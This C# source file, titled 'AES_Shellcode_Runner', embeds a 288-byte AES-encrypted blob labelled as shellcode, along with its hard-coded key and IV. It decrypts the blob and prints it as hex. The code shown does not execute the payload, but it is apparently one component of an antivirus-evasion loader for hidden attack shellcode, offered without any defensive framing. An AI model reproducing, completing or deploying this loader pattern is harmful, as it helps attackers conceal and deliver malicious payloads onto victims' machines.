using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Linq;

namespace AES_Shellcode_Runner
{
    internal class Program
    {

        static byte[] AES_Decrypt(byte[] encryptedStuff, byte[] key, byte[] iv)
        {
            byte[] decryptedBytes = null;


            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.Key = key;
                    AES.IV = iv;
                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedStuff, 0, encryptedStuff.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }
        static void Main(string[] args)
        {

            // SHELLCODE VARIABLES

            byte[] encryptedStuff = new byte[288] { 0x28, 0x74, 0xa1, 0xeb, 0x9b, 0x44, 0xeb, 0x7f, 0xc1, 0x84, 0xde, 0x21, 0x76, 0x20, 0xd4, 0xa6, 0xc3, 0x00, 0x11, 0x30, 0x5b, 0xe2, 0x83, 0xe1, 0xc6, 0x61, 0xb2, 0x16, 0x8c, 0xe3, 0x65, 0x81, 0x8e, 0xf7, 0xbc, 0x57, 0x0f, 0x29, 0xba, 0x17, 0x5b, 0xe2, 0x59, 0x98, 0x74, 0x3a, 0x01, 0x67, 0x6a, 0x35, 0xc0, 0x11, 0x12, 0x79, 0x6e, 0x40, 0xf0, 0x21, 0x2f, 0x1f, 0x09, 0x9b, 0xe1, 0x0c, 0x92, 0x70, 0xb1, 0x3b, 0x28, 0x18, 0xbb, 0x92, 0xf3, 0xe3, 0x5d, 0x33, 0x5f, 0x70, 0x24, 0x49, 0xe5, 0xb2, 0x62, 0xbc, 0x40, 0x00, 0x3e, 0x2a, 0x2b, 0x95, 0xab, 0xe6, 0x27, 0xe4, 0xb7, 0x9c, 0xe1, 0x2e, 0x64, 0xa7, 0x43, 0xa5, 0xc3, 0x56, 0xb1, 0x01, 0x6f, 0xa8, 0xcd, 0x2e, 0x73, 0x11, 0x5a, 0x7f, 0x05, 0xa5, 0x85, 0xa6, 0xf2, 0xf2, 0x6a, 0xd6, 0x6f, 0xfb, 0x8b, 0xfc, 0x17, 0x82, 0x4a, 0x19, 0x98, 0x30, 0x2f, 0xe0, 0xec, 0xe9, 0x7b, 0xfd, 0x5b, 0x3f, 0xdf, 0x81, 0x6a, 0x93, 0x6a, 0xb2, 0x12, 0x20, 0x9c, 0x06, 0x82, 0x04, 0xf6, 0xac, 0x02, 0xcb, 0x03, 0x28, 0x0d, 0xfa, 0xc3, 0x7f, 0xec, 0xae, 0x25, 0xd3, 0x94, 0x5b, 0xc8, 0x15, 0x53, 0x48, 0x4c, 0x24, 0x94, 0xa4, 0x70, 0x28, 0x1a, 0x1e, 0xb8, 0x3e, 0x33, 0xfc, 0x9c, 0x68, 0xa7, 0x46, 0x5a, 0x57, 0xf6, 0x30, 0x5e, 0x23, 0xc3, 0x69, 0x07, 0xe0, 0xe5, 0x55, 0x9d, 0xa6, 0x70, 0x10, 0x6b, 0x41, 0x82, 0xd5, 0x29, 0xaf, 0x9c, 0x3d, 0x93, 0x25, 0x4a, 0x9d, 0x8d, 0xaf, 0xa3, 0xdb, 0x04, 0x07, 0xcb, 0x0f, 0x4a, 0xf3, 0x15, 0x14, 0xdb, 0x33, 0xe2, 0x17, 0x68, 0x6e, 0x01, 0x04, 0xda, 0xd5, 0x0e, 0x11, 0x42, 0x5f, 0x88, 0x91, 0xa2, 0x05, 0x44, 0xb1, 0xe6, 0x52, 0xaa, 0xeb, 0xc7, 0xd1, 0xf8, 0x2b, 0xf7, 0xe6, 0x06, 0x20, 0x5f, 0xae, 0x10, 0x9b, 0x2c, 0xf4, 0x21, 0x08, 0x61, 0xbb, 0x1a, 0x38, 0xb4, 0x60, 0xf3, 0x17, 0x61, 0xde, 0x6e, 0xae, 0x43, 0xb9, 0x92, 0x28, 0x5e, 0x84, 0x36, 0x19 };
            byte[] key = new byte[32] { 0xde, 0xff, 0x62, 0xa7, 0xbc, 0x9f, 0xc4, 0x6c, 0x0c, 0x9b, 0x54, 0x63, 0x88, 0x42, 0xb6, 0x24, 0x5f, 0x5c, 0x86, 0xcc, 0x6e, 0x3b, 0xd6, 0x9c, 0x9a, 0x8c, 0x6f, 0xb6, 0xfb, 0x39, 0xfb, 0xcc };
            byte[] iv = new byte[16] { 0xaa, 0xbd, 0xee, 0x7e, 0x3e, 0x13, 0x5e, 0x2c, 0xa9, 0x6c, 0xf5, 0x1c, 0xf2, 0xe9, 0xfc, 0x87 };


            byte[] buf = AES_Decrypt(encryptedStuff, key, iv);
            Console.WriteLine("Decrypted Shellcode\n");
            Console.WriteLine(String.Join("", buf.Select(by => by.ToString("X2"))));
        }
    }
}
